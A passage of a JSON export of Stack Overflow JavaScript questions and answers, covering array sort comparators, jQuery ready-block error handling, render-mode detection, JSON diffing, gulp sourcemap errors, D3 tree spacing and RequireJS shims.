sortedArray = myArray.sort(function(a,b){\n                                    return (a-b);\n                                });\n</code></pre>\n\n<p>If you had an array of objects and wanted to sort on some particular property or properties of the objects you could do that too. Assuming, e.g., objects in this format:</p>\n\n<pre><code>{ id : 1,\n  name : \"Fred\",\n  address : \"12 Smith St\",\n  phone : \"0262626262\" }\n</code></pre>\n\n<p>Then you could sort an array of such objects by their 'id' attribute as follows:</p>\n\n<pre><code>var sortedArray = myArray.sort(function(a,b){\n                                  return (a.id - b.id);\n                              });\n</code></pre>\n\n<p>Or you could sort an array of such objects by their 'name' attribute (alphabetical) as follows:</p>\n\n<pre><code>var sortedArray = myArray.sort(function(a,b){\n                                   if (a.name &lt; b.name)\n                                      return -1;\n                                   else if (a.name == b.name)\n                                      return 0;\n                                   else\n                                      return 1;\n                               });\n</code></pre>\n\n<p>Note that in my final example I've put the full <code>if / else if / else</code> structure I mentioned earlier.</p>\n\n<p>For the example where you are sorting objects with multiple properties you could expand that further to include a secondary sort, that is, (in my example) if the name properties are equal you could then return a comparison of, say, the phone property.</p>\n",
                    "is_accepted": false,
                    "score": 7
                },
                {
                    "body": "<p>The \"compare\" function must take two arguments, often referred to as <strong>a</strong> and <strong>b</strong>.  Then you make the compare function return 0, greater than 0, or less than 0, based on these values, <strong>a</strong> and <strong>b</strong>.</p>\n\n<ol>\n<li>Return greater than 0 if <strong>a</strong> is greater than <strong>b</strong></li>\n<li>Return 0 if <strong>a</strong> equals <strong>b</strong></li>\n<li>Return less than 0 if <strong>a</strong> is less than <strong>b</strong></li>\n</ol>\n\n<p>With these three return values, and only two arguments, it is possible to write a compare function that can sort any type of input data type, or complex data structures.</p>\n\n<p>Then, when you call sort(), with your custom compare function, the compare function is called on pairs in your to-be-sorted list, to determine the proper ordering.</p>\n\n<p>Lets walk through a simple example... Suppose you're only sorting some numbers, so we have a very simple compare function:</p>\n\n<pre><code>function compare(a,b) {\n    return a - b;\n}\n</code></pre>\n\n<p>Simply subtracting b from a will always return greater than zero if a is larger than b, 0 if they are equal, or less than zero if a is less than b.  So it meets the requirements for a compare function.</p>\n\n<p>Now lets suppose this is our list of numbers to sort:</p>\n\n<pre><code>var numbers = [1,5,3.14];\n</code></pre>\n\n<p>When you call <code>numbers.sort(compare)</code>, internally it will actually execute:</p>\n\n<pre><code>compare(1,5);     // Returns -4, a is less than b\ncompare(1,3.14);  // Return -4, a is less than b\ncompare(5,3.14);  // returns 1.86, a is greater than b\n</code></pre>\n\n<p>If you've ever done manual sorting or alphabetizing, you've done precisely the same thing, probably without realizing it.  Even though you may have dozens or hundreds of items to compare, you're constantly comparing only two numbers (or author's last names, or whatever) at a time.  Going through or short list of three numbers again, you'd start by comparing the first two numbers:</p>\n\n<ol>\n<li>Is 1 greater than or less than 5?  Less than, so put these two numbers in our list: 1,5</li>\n<li>Is 3.14 greater than or less than 1?  Greater than, so it goes after 1 in the new list</li>\n<li>Is 3.14 greater than or less than 5 in our new list? Less than, so it goes before 5.  Our new list is now [1,3.14,5]</li>\n</ol>\n\n<p>Because you can provide your own compare() function, it is possible to sort arbitrarily complex data, not just numbers.</p>\n",
                    "is_accepted": true,
                    "score": 22
                },
                {
                    "body": "<p>I think it may be like this(well, I am not sure about this.)\uff1a</p>\n\n<p>suppose the function <code>compare(a,b)</code> is the compare function.\nIt returns  <code>c</code>.\nsuppose we are going to sort the entries in the array<code>N</code> to get the sort result array <code>M</code>.</p>\n\n<p>I don't know the exact sort algorithm , and different browsers even return different results if <code>c</code> is neither <code>(a-b)</code> nor <code>(b-a)</code> (say, if  <code>c</code> is <code>\"b-2\"</code>, <code>\"a+b\"</code> or some other expressions).</p>\n\n<p>But according to <code>ECMA-262</code> , the sort result should be like this:</p>\n\n<p>a , b can be any two of the indexes.\nthis means we actually passed an ordered pair to the compare function.\n<code>eg: (0,1),(1,4), or even (2,0) , (2,1)</code>.</p>\n\n<p>The ECMAScript Language Specification says the result should have this property:\n<code>(a,b)</code>is an ordered pair passed to the compare function.</p>\n\n<ul>\n<li>if <code>c</code> (what the function returns) is less than zero, then <code>M(a)&lt; M(b)</code> must be satisfied.</li>\n</ul>\n\n<p>And the specification talks nothing about what would happen  if c is zero or bigger than zero.</p>\n\n<p>I am not sure  whether this is right.\nAt least this  can easily explain why when <code>c</code> is <code>\"a-b\"</code> , the entries are sorted to be numerically and ascending, and why when <code>c</code> is <code>\"b-a\"</code>,the entries are sorted to the opposite.</p>\n\n<p>Are the js engines of the  browsers are not really designed strictly according to `ECMA-262 or am  I totally wrong?</p>\n\n<p>Reference\uff1a</p>\n\n<p><a href=\"http://www.ecma-international.org/publications/files/ECMA-ST/Ecma-262.pdf\" rel=\"nofollow\">The Fifth Edition of ECMA-262  (Check page 129-130)</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>This method uses the syntax and parameters of the order of Array.sort (the compareFunction the sortOptions), whose parameters are defined as follows:</p>\n\n<p>compareFunction - a comparison function used to determine the sort order of the array elements. This parameter is optional. The comparison function should be used to compare the two parameters. A and B of a given element, the result of compareFunction can have a negative value, 0 or a positive value:</p>\n\n<p>If the return value is negative, it means that A appears before B in the sorted sequence.\nIf the return value is 0, then A and B have the same sort order.\nIf the return value is positive, it means that A appears after B in the sorted sequence.</p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>As already asked, how does sort function work in javascript, along with compare function?\nIf I have an array, and I do array.sort(compare) now it was written in the book that if the compare function returns a-b(two indices of the array) then it works based on the fact that whether the result is greater than 0, less than 0 or equal to 0. But how exactly does it work? I could not work it out.</p>\n",
            "last_activity_date": 1422644437,
            "question_id": 6567941,
            "score": 12,
            "tags": [
                "javascript"
            ],
            "title": "How does sort function work in javascript, along with compare function"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Have you attempted wrapping the error-prone commands in try...catch brackets?</p>\n\n<pre><code>$(function(){\n    try {\n    \tnoObject.noMethod();\n    } catch (error) {\n    \t// handle error\n    }\n});\n\n$(function(){\n    try {\n    \talert(\"Hello World\");\n    } catch (error) {\n    \t// handle error\n    }\n});\n</code></pre>\n\n<p>To avoid potential confusion, <code>$(function(){ ... });</code> is functionally the same as <code>$(document).ready(function(){ ... });</code></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I haven't tried this code, but it should work (at least, the idea should anyway). <s>Make sure you include it AFTER jquery, but BEFORE any potentially buggy scripts.</s> (Not necessary, see comments.)</p>\n\n<pre><code>var oldReady = jQuery.ready;\njQuery.ready = function(){\n  try{\n    return oldReady.apply(this, arguments);\n  }catch(e){\n    // handle e ....\n  }\n};\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 12
                },
                {
                    "body": "<p>You could re-reference jQuery before each of your code blocks.  Your code would then use the fresh instance of the library, and it would execute.  I've tested this in Safari 4.0.3 on OSX.</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js\"&gt;&lt;/script&gt;\n    &lt;script type=\"text/javascript\"&gt;\n    \tjQuery(document).ready(function() {\n    \u00a0 \u00a0 \u00a0 \u00a0 nosuchobject.fakemethod(); \u00a0 \u00a0 \u00a0 //intentionally cause major error\n    \u00a0 \u00a0 });\n    &lt;/script&gt;\n    &lt;script type=\"text/javascript\" src=\"http://ajax.googleapis.com/ajax/libs/jquery/1.3/jquery.min.js\"&gt;&lt;/script&gt;\t\n    &lt;script type=\"text/javascript\"&gt;\n    \u00a0 \u00a0 jQuery(document).ready(function() {\n    \u00a0 \u00a0 \u00a0 \u00a0 alert(\"Hello!\"); \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 //executed!\n    \u00a0 \u00a0 });\n    &lt;/script&gt;\t\n\n&lt;/head&gt;\n&lt;body&gt;\n\n&lt;p&gt;hello world&lt;/p&gt;\n\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n",
                    "is_accepted": false,
                    "score": -1
                },
                {
                    "body": "<p>To answer your question, both of the <code>ready</code> blocks are essentially combined into one given the way jQuery works:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n  jQuery(document).ready(function() {\n      nosuchobject.fakemethod();       //intentionally cause major error\n      alert(\"Hello!\");                 //never executed\n  });\n&lt;/script&gt;\n</code></pre>\n\n<p>So that's why its not alerting per the error above. I don't believe there is a way to fix this to make every <code>ready</code> function run regardless of former failures.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Here is solution, it will wrap any function sent to ready with try-catch block:</p>\n\n<pre><code>(function($){\n    $.fn.oldReady = $.fn.ready;\n    $.fn.ready = function(fn){\n        return $.fn.oldReady( function(){ try{ if(fn) fn.apply($,arguments); } catch(e){}} );\n    }\n})(jQuery);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 0
                }
            ],
            "body": "<p>I'm developing JS that is used in a web framework, and is frequently mixed in with other developers' (often error-prone) jQuery code. Unfortunately errors in their jQuery(document).ready blocks prevent mine from executing. Take the following simple sample:</p>\n\n<pre><code>&lt;script type=\"text/javascript\"&gt;\n    jQuery(document).ready(function() {\n        nosuchobject.fakemethod();       //intentionally cause major error\n    });\n&lt;/script&gt;\n&lt;script type=\"text/javascript\"&gt;\n    jQuery(document).ready(function() {\n        alert(\"Hello!\");                 //never executed\n    });\n&lt;/script&gt;\n</code></pre>\n\n<p>Shouldn't the second ready block execute regardless of what happened in the previous? Is there a \"safe\" way to run jQuery(document).ready that will run even in the case of previous errors?</p>\n\n<p>EDIT: I have no control/visibility over the error-prone blocks as they're written by other authors and mixed in arbitrarily.</p>\n",
            "last_activity_date": 1377752837,
            "question_id": 1890512,
            "score": 12,
            "tags": [
                "javascript",
                "jquery"
            ],
            "title": "Handling errors in jQuery(document).ready"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>Before IE8:</p>\n\n<pre><code>alert('Page was rendered in ' +\n  ((document.compatMode == 'CSS1Compat') ? 'Standards' : 'Quirks') + ' Mode.');\n</code></pre>\n\n<p>For IE8:</p>\n\n<pre><code>var vMode = document.documentMode;\nvar rMode = 'IE5 Quirks Mode';\nif(vMode == 8){\n  rMode = 'IE8 Standards Mode';\n} else if(vMode == 7){\n  rMode = 'IE7 Strict Mode';\n}\nalert('Rendering in: ' + rMode);\n</code></pre>\n\n<p>Be aware that to gain the benifits of IE8's new \"standards mode by default\" behavior you'll need to be rendering in IE8 Standards Mode.</p>\n\n<p>This mode affects the rendering of your HTML+CSS <strong>as well as the fixes to JavaScript</strong> methods like <code>document.getElementById( id );</code> and <code>.setAttribute( name, value );</code></p>\n",
                    "is_accepted": true,
                    "score": 21
                },
                {
                    "body": "<p>You should also have a look at jQuerys jQuery.support . It will tell you what standards are supported by the browser (boxModel, opacity, etc.)</p>\n\n<p><a href=\"http://docs.jquery.com/Utilities/jQuery.support\" rel=\"nofollow\">http://docs.jquery.com/Utilities/jQuery.support</a></p>\n\n<p>i.e.</p>\n\n<pre><code>jQuery.support.boxModel; //false in IE when in quirksmode, true otherwise.\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I know that modern browsers generally have two render mode: standard mode and quirk mode. The browser detects the heading DocType.</p>\n\n<p>The question is how to detect render mode of current page at runtime. Is there any Firebug tool to do that?</p>\n",
            "last_activity_date": 1236503478,
            "question_id": 623047,
            "score": 12,
            "tags": [
                "javascript",
                "browser",
                "render",
                "standards",
                "mode"
            ],
            "title": "How to detect Render Mode of browser for current page?"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>This has been something I've been struggling with as well. I'll be keenly interested if anyone else offers a better answer than mine, but for the time being...</p>\n\n<p>first off, there is <a href=\"http://www.xn--schler-dya.net/blog/2008/01/15/diffing_json_objects/\" rel=\"nofollow\">http://www.xn--schler-dya.net/blog/2008/01/15/diffing_json_objects/</a></p>\n\n<p>I personally have not been able to get this library to work, but your milage may vary.</p>\n\n<p>The other alternative is to not try to solve the problem using the DIFF algorithm. It's quite innefficient, and depending on the problem, you may get better performance metrics just sending the whole blob of data, even if you do end up repeating yourself. This is true mainly of very small chunks of data. Obviously there's going to be a turning point as the data you need to transmit gets larger, but it's not going to be obvious where the turning point is, without some kind of measurement. The trick here, is that the bigger your data gets, the longer your diff calculation is going to take too. The turning point is only determined by the intersection of the two lines formed by each method's rate of growth, both of which are going to be linear or worse, depending on how your diff is implemented. In a worst case scenario, you may see an island in the middle where diff gets better performance, but then crosses back again for even larger data sets, and just plain sending it over the network is better again.</p>\n\n<p>Next stop before trying diff, is by wrapping your data access in \"get\", \"set\" and \"delete\" methods that track the changes being made. The data you send over the wire would essentially be a sequential log of these method's usage, which you flush from the client side on each successful transmission. On the serverside you apply this log to your serverside data with serverside analogues to your data access methods. This is a somewhat lighter solution than a diff that doesn't require quite as much processing power. </p>\n\n<p>Finally, if you're going to do diff, the most efficient way I can think of is if you can break your dataset down into discrete \"chunks\", each with a unique ID. Then when you run the diff, the courseness of the diff is exactly at the \"chunk\" level. that is, the only comparisons you'd make is ID to ID. If you change a chunk, give it a new id. The courser you can afford to make the diff algorithm, the less time it will take to run. </p>\n\n<p>Alternatively, rather than assigning a new ID on change, you could simply run the diff to check whether a specific object has \"changed\", stop short as soon as you detect a change, and simply mark that chunk to be re-sent in its entirity, to update the chunk on the server side with the same ID. This could be made even more efficient if you have some kind of quick hashing algorithm for your chunks that you can use to quickly establish equality. </p>\n\n<p>If the sequence of your chunks doesn't matter, or if you can store the sequence as a property of the chunks themselves, rather than modeled by the physical sequence of the chunks, then you can even key your chunks by ID. Then discovering the differences is simply a matter of listing the keys of object A, and looking them up on object B, and then Vice Versa. This is much simpler to implement than a \"real\" diff algorithm, it has O(a+b) performance which( I think ) is better than the worst case scenario for a real diff algorithm, which you're likely to get if you're trying to implement it yourself, or get a bad implementation. </p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>why create a diff in the first place wouldn't it be more efficient to hook into the events that change your data and generate a changed dataset based on the changes? As your code will be embedded in a browser you'll be limited to JavaScript so generating a diff could kill performance of your app.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>somewhere there's a grad thesis here, to find a solution that's both an efficient transmission of \"what's new\" and which plays nice with web architectures (caching and saving a minimum amount of state on the server).</p>\n\n<p>I'm curious what's out there; I've been grappling with this very same question, the \"chunk\" idea in @Breton's answer is kinda where I'm going, but not sure how.</p>\n\n<p>edit: wait -- I got this backwards, I thought you were talking about the server calculating diffs to send to the client.</p>\n\n<p>Perhaps you could describe in vague details the structure of data on the client that is sent to the server. I wouldn't do it based on the JSON text itself if at all possible; do the diffs from within Javascript. If it's a list of items with known structure, keep track of which ones you've sent to the server and send the rest. If it's a more complicated dataset, not sure how to help you there.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><a href=\"http://etherpad.com/\" rel=\"nofollow\">EtherPad</a> solved something like this by turning each source change into a mathematical operation that could be commutative, associative, etc.  I would consider this a non-trivial problem, though, and EtherPad was able to form a business around the solution to this problem.</p>\n\n<p>edit: interestingly enough, this is exactly the problem that a good DVCS like Git tackles, just not on the browser.</p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>I publish today a small jQuery plugin doing a diff between two JS objects.\n<a href=\"http://plugins.jquery.com/project/jquery-diff\" rel=\"nofollow\">http://plugins.jquery.com/project/jquery-diff</a></p>\n\n<p>I use it into an application to send to the server backend only the modified data.</p>\n",
                    "is_accepted": false,
                    "score": 2
                },
                {
                    "body": "<p>It's not JSON aware, but there's the method Google seems to use for Docs (their version of the above mentioned Etherpad problem).</p>\n\n<p><a href=\"http://code.google.com/p/google-diff-match-patch/\" rel=\"nofollow\">http://code.google.com/p/google-diff-match-patch/</a></p>\n\n<p>It wouldn't be JSON aware, but it would allow you to generate an efficient diff client-side in JavaScript, and have the server apply it using an appropriate implementation (Java, JavaScript, C++, C#, Objective C, Lua, or Python). </p>\n\n<p>This answer to another question might be useful, especially the part about a modified version of google-diff-match-patch: <a href=\"http://stackoverflow.com/questions/4599456/textually-diffing-json/4599500#4599500\">Textually diffing JSON</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>\"I have now created a method for returning structural differences between two JSON objects.\"</p>\n\n<p><a href=\"http://www.xn--schler-dya.net/blog/2008/01/15/diffing_json_objects/\" rel=\"nofollow\">http://www.xn--schler-dya.net/blog/2008/01/15/diffing_json_objects/</a></p>\n",
                    "is_accepted": false,
                    "score": -2
                }
            ],
            "body": "<p>I am going to be periodically pushing a set of text-based data <strong>from a web-page to a server</strong>, probably as JSON.</p>\n\n<p>For every push, none, some or all of the data may have changed. To reduce the amount of data I have to send over the wire I would want to only send a diff of the changes in each push.</p>\n\n<p>Do you know of any pre-made solutions / tools / libraries that:</p>\n\n<ul>\n<li><strong>Dynamically build a diff of JSON as changes are made</strong> to it (to avoid storing oldJson and newJson and doing a full diff every push) written in JavaScript (i.e. for the client-side)</li>\n<li><strong>Patch an existing chunk of JSON with a JSON diff</strong> on the server side, written on any platform that isn't Java or .NET^ (needs to run on linux, Java's not an option for the env I'm in, neither is Mono).</li>\n</ul>\n\n<p>Moreover, is this even the best way of going about this particular problem? <strong>Is there a better way to push chunks of text data around?</strong></p>\n\n<p><strong>Edit:</strong> Some clarifications:</p>\n\n<ul>\n<li>The probable data stucture would be basically a fairly flat (in the sense that it's hightly connected so any links will be ID-based references not actual nested data) collection of nodes. Nodes contain a collection of trees, the leaves of these trees contain actual 'primative' data, such as numbers, strings and Ids. Most data change will be in the leaves.\n<ul>\n<li>Most of the leaf data will be very small (primatives or less than a paragraph of text) but some will be very long (pages of \"rich\" text).</li>\n</ul></li>\n<li>For the moment we can consider this strictly one-to-one, i.e. there is only one client connected (in read / write) to any particular data structure.</li>\n<li>It would be nice to keep the server as minimal as possible in terms of complexity-- the idea is to move away from having a server as much as possible. While HTML5 is still mostly unsupported I still need one to store data with though...</li>\n</ul>\n\n<p><strong><em>^</strong> That that you would expect on random shared hosting. I'm talking your good friends PHP, Python, PERL, Ruby, those fullas.</em> Or, something that could be easily installed on random shared hosting.</p>\n",
            "last_activity_date": 1330081004,
            "question_id": 584338,
            "score": 12,
            "tags": [
                "javascript",
                "json",
                "diff"
            ],
            "title": "How to push diffs of data (possibly JSON) to a server?"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<p>Not entirely sure <em>why</em> this fixes it, but changing the autoprefixer pipe to:</p>\n\n<pre><code>.pipe(autoprefixer({\n     browsers: ['last 2 versions'],\n     cascade: false\n}))\n</code></pre>\n\n<p>and putting it before the sass pipe (top) allows it to build succesfully.</p>\n",
                    "is_accepted": false,
                    "score": 5
                },
                {
                    "body": "<p>Disabling sourcemaps is some kind of mystery right now. You have to do it like this</p>\n\n<pre><code>.pipe(sass({ \"sourcemap=none\": true }))\n</code></pre>\n\n<p><a href=\"https://github.com/sindresorhus/gulp-ruby-sass/issues/156\">Source</a></p>\n",
                    "is_accepted": true,
                    "score": 14
                },
                {
                    "body": "<p>I fixed this problem keeping the source maps and using <a href=\"https://www.npmjs.org/package/gulp-filter\" rel=\"nofollow\">gulp-filter</a>:</p>\n\n<pre><code>var filter = require('gulp-filter')\nvar filterCSS = filter('**/*.css');\n\ngulp.task('styles', function() {\n    return gulp.src('sass/*.scss')\n      .pipe(sass({ style: 'expanded', sourcemap: true }))\n\n      // Filters only css files before auto prefixing\n      .pipe(filterCSS)\n      .pipe(autoprefixer('last 2 version', 'safari 5', 'ie 8', 'ie 9', 'opera 12.1'))\n      .pipe(filterCSS.restore())\n\n      .pipe(gulp.dest('css'))\n      .pipe(rename({suffix: '.min'}))\n      .pipe(minifycss())\n      .pipe(gulp.dest('css'));\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Try upgrading to gulp-ruby-sass 1.0.0-alpha. It uses gulp-sourcemaps and should avoid all iterations of this problem. </p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I was having the same issue with the <strong>gulp-ruby-sass plugin</strong>. I found <strong><a href=\"http://www.devworkflows.com/posts/getting-scss-auto-prefixer-and-source-map-to-play-nice/\" rel=\"nofollow\">this</a></strong> blog post which explains that there are a couple of bugs in the gulp-ruby-sass plugin regarding source maps. They have both been closed a little over a week ago. If you upgrade to <strong>gulp-ruby-sass~1.0.0-alpha</strong> this should fix the issues your having with source maps.</p>\n\n<p>If that doesn't work the article I linked to above shows how to use the <strong>gulp-sass</strong> plugin which which doesn't have the source map issue.</p>\n",
                    "is_accepted": false,
                    "score": 2
                }
            ],
            "body": "<p>Getting a strange error using a basic gulp/express build watch.</p>\n\n<p><strong>Directory Layout</strong></p>\n\n<pre><code> project/\n   - sass/\n      - style.scss\n   - gulpfile.js\n   - index.html\n</code></pre>\n\n<p><strong>Gulpfile.js</strong></p>\n\n<pre><code>var gulp         = require('gulp'),\n    sass         = require('gulp-ruby-sass'),\n    autoprefixer = require('gulp-autoprefixer'),\n    minifycss    = require('gulp-minify-css'),\n    rename       = require('gulp-rename');\n\ngulp.task('express', function() {\n  var express = require('express');\n  var app = express();\n  app.use(require('connect-livereload')({port: 4002}));\n  app.use(express.static(__dirname));\n  app.listen(4000);\n});\n\nvar tinylr;\ngulp.task('livereload', function() {\n  tinylr = require('tiny-lr')();\n  tinylr.listen(4002);\n});\n\nfunction notifyLiveReload(event) {\n  var fileName = require('path').relative(__dirname, event.path);\n\n  tinylr.changed({\n    body: {\n      files: [fileName]\n    }\n  });\n}\n\ngulp.task('styles', function() {\n    return gulp.src('sass/*.scss')\n      .pipe(sass({ style: 'expanded', sourcemap: false }))\n      .pipe(autoprefixer('last 2 version', 'safari 5', 'ie 8', 'ie 9', 'opera 12.1'))\n      .pipe(gulp.dest('css'))\n      .pipe(rename({suffix: '.min'}))\n      .pipe(minifycss())\n      .pipe(gulp.dest('css'));\n});\n\ngulp.task('watch', function() {\n  gulp.watch('sass/*.scss', ['styles']);\n  gulp.watch('*.html', notifyLiveReload);\n  gulp.watch('css/*.css', notifyLiveReload);\n});\n\ngulp.task('default', ['styles', 'express', 'livereload', 'watch'], function() {\n\n});\n</code></pre>\n\n<p><strong>Style.scss</strong></p>\n\n<pre><code>body { position: relative; }\n</code></pre>\n\n<p>The express server/livereload works fine, but when it tries to compile the stylesheet I'm getting this error (even with <code>sourcemap: false</code>)</p>\n\n<pre><code>gulp-ruby-sass: write style.css.map\n\nevents.js:72\n        throw er; // Unhandled 'error' event\n              ^\nError: &lt;LOCAL_PATH_HERE&gt;/style.css.map:3:1: Unknown word\n</code></pre>\n",
            "last_activity_date": 1417271968,
            "question_id": 26979433,
            "score": 11,
            "tags": [
                "javascript",
                "css",
                "ruby",
                "sass",
                "gulp"
            ],
            "title": "gulp with gulp-ruby-sass: Error: ../style.css.map:3:1: Unknown word"
        },
        {
            "answer_count": 1,
            "answers": [
                {
                    "body": "<p>Updating this answer. I talked with my friend and we looked at the source for <code>size</code> and <code>nodeSize</code></p>\n\n<pre><code>  tree.size = function(x) {\n    if (!arguments.length) return nodeSize ? null : size;\n    nodeSize = (size = x) == null;\n    return tree;\n  };\n\n  tree.nodeSize = function(x) {\n    if (!arguments.length) return nodeSize ? size : null;\n    nodeSize = (size = x) != null;\n    return tree;\n  };\n</code></pre>\n\n<p>When you set a <code>size</code> for the tree, you are setting a fixed size so that the tree has to conform to that width and height. When you set a <code>nodeSize</code>, the tree has to be dynamic so it resets the size of the tree. </p>\n\n<p>When I specified <code>size</code> after <code>nodeSize</code>, I was pretty much overriding what I wanted haha...</p>\n\n<p><strong>Bottom line</strong>: If you want <code>nodeSize</code> to work, you can't have a fixed tree size. It will set the size to <code>null</code>. Do not declare a <code>size</code> if you are declaring a <code>nodeSize</code>.</p>\n\n<p><strong>EDIT: D3.js actually <a href=\"https://github.com/mbostock/d3/wiki/Tree-Layout#nodeSize\" rel=\"nofollow\">updated the documentation</a>. Thanks to whoever did that because it is way clearer now!</strong></p>\n\n<blockquote>\n  <p>The nodeSize property is exclusive with tree.size; setting\n  tree.nodeSize sets tree.size to null.</p>\n</blockquote>\n\n<p>This is what my tree looks like now. I have also added zoom functionality as well as how to center text within the rectangle.</p>\n\n<p><img src=\"http://i.stack.imgur.com/Cew42.png\" alt=\"Picture where nodeSize is set at width of 100 and height of 30\"></p>\n\n<p>Here is a jsFiddle: <a href=\"http://jsfiddle.net/augburto/YMa2y/\" rel=\"nofollow\">http://jsfiddle.net/augburto/YMa2y/</a></p>\n",
                    "is_accepted": true,
                    "score": 17
                }
            ],
            "body": "<p>Right now I am trying to separate my rectangle nodes because they overlap as shown in the picture below:</p>\n\n<p><img src=\"http://i.stack.imgur.com/OF3uN.png\" alt=\"enter image description here\"></p>\n\n<p>I took a look and found out that D3 offers a <a href=\"https://github.com/mbostock/d3/wiki/Tree-Layout#wiki-nodeSize\">nodeSize</a> and <a href=\"https://github.com/mbostock/d3/wiki/Tree-Layout#wiki-separation\">separation</a> method but for some reason it did not work.</p>\n\n<p>I found this <a href=\"http://javaguirre.net/2013/01/30/fixing-nodes-overlapping-d3-tree/\">blog post</a> talking about the issue but he says</p>\n\n<blockquote>\n  <p>The size property doesn\u2019t exist in nodes, so it will be whatever property you want to control the size of them.</p>\n</blockquote>\n\n<p>but clearly there is a nodeSize method so I feel like I am simply using the method incorrectly and/or the blog post is out-of-date. I want to shape my nodes to be the size of the rectangle and space them out evenly so they do not overlap each other. Does anyone know how to use the methods properly? The documentation about these methods isn't explained very well and it isn't yielding any difference. I also couldn't find many examples where people changed the nodeSize of trees or needed separation for rectangular objects (there were some examples regarding circular ones but I feel that's too different...)</p>\n\n<p>Here is the relevant code. I will try to prepare a JSFiddle.</p>\n\n<pre><code>var margin = {top: 20, right: 120, bottom: 20, left: 120},\n    height = 960 - margin.right - margin.left,\n    width = 800 - margin.top - margin.bottom,\n    rectW = 70;\n    rectH = 30;\n    //bbox = NaN,\n    maxTextLength = 0;\n\nvar i = 0,\n    duration = 750,\n    root;\n\n\n//paths from each node drawn initially here\n//changed to d.x, d.y\nvar diagonal = d3.svg.diagonal()\n    .projection(function(d) { return [d.x+rectW/2, d.y+rectH/2];\n    //.projection(function(d) { return [d.x+bbox.getBBox().width/2, d.y+bbox.getBBox().height/2]; \n});\n\nvar tree = d3.layout.tree()\n    .nodeSize([30,70])\n    .separation(function(a, b) { return (a.parent == b.parent ? 1 : 2); })\n    .size([width, height]);\n\nvar svg = d3.select(\"body\")\n            .append(\"svg\")\n              .attr(\"height\",\"100%\").attr(\"width\",\"100%\")\n              .call(d3.behavior.zoom().on(\"zoom\", redraw))\n              .append(\"g\")\n                .attr(\"transform\", \"translate(\" + margin.top + \",\" + margin.left + \")\");\n</code></pre>\n",
            "last_activity_date": 1415061930,
            "question_id": 17558649,
            "score": 11,
            "tags": [
                "javascript",
                "tree",
                "d3.js"
            ],
            "title": "D3 Tree Layout Separation Between Nodes using NodeSize"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>Do you <em>require</em> underscorestring somewhere? Because if it isn't required, it won't be loaded.\nI managed to get it working with almost exactly the same code you posted:</p>\n\n<pre><code>require.config({\n    paths: {\n        underscore: [\n            '//raw.github.com/documentcloud/underscore/master/underscore-min'\n        ,   'lib/underscore'\n        ]\n    ,   underscorestring: 'https://raw.github.com/epeli/underscore.string/master/dist/underscore.string.min'\n    }\n,   shim: {\n        underscore: { exports: '_' },\n        underscorestring: {\n            deps: ['underscore'],\n            init: function(_) { \n                _.mixin(_.str.exports());\n                return _; // guess, this is not needed.\n            }\n        }\n    }\n,   exclude: ['underscore']\n});\n\nrequire(['underscore', 'underscorestring'], function(_) {\n    console.log( _.chars(\"i'm a happy string.\") );\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>I don't know if it's the correct way, but I got it working by inverting things so that underscore depends on underscore.string. Also, this way you don't have to require underscore.string.</p>\n\n<pre><code>require.config({\n  shim: {\n    'backbone': {\n      deps: ['underscore', 'jquery'],\n      exports: 'Backbone'\n    },\n    'underscore': {\n      deps: ['underscore.string'],\n      exports: '_',\n      init: function(UnderscoreString) {\n        _.mixin(UnderscoreString);\n      }\n    }\n  },\n  paths: {\n    'backbone'          : 'lib/backbone',\n    'jquery'            : 'lib/jquery/jquery',\n    'text'              : 'lib/require/text',\n    'underscore'        : 'lib/underscore',\n    'underscore.string' : 'lib/underscore.string'\n  }\n});\n</code></pre>\n\n<p>.</p>\n\n<p><strong>Update: 3/14/2014</strong></p>\n\n<p>Underscore.js v1.6.0 brought back AMD compatibility and <code>init()</code> has been removed from RequireJS, so some refactoring is in order. To continue getting Underscore preloaded with Underscore.string I made a mixer module to pull them together.</p>\n\n<p><sub>New Require.js config</sub></p>\n\n<pre><code>requirejs.config({\n  paths: {\n    'backbone'            : '../lib/backbone/backbone',\n    'backbone.base'       : '../lib/backbone/backbone.base',\n    'backbone.extensions' : '../lib/backbone/backbone.extensions',\n    'jquery'              : '../lib/jquery/jquery',\n    'text'                : '../lib/require/text',\n    'underscore'          : '../lib/underscore/underscore',\n    'underscore.mixed'    : '../lib/underscore/underscore.mixed',\n    'underscore.string'   : '../lib/underscore/underscore.string'\n  },\n  shim: {\n    'backbone.base': {\n      deps: ['underscore.mixed', 'jquery'],\n      exports: 'Backbone'\n    },\n  }\n});\n</code></pre>\n\n<p><sub>underscore.mixed</sub></p>\n\n<pre><code>define([\n  'underscore',\n  'underscore.string'\n], function(_, _s) {\n  _.mixin(_s.exports());\n  return _;\n});\n</code></pre>\n\n<p>The final step is to 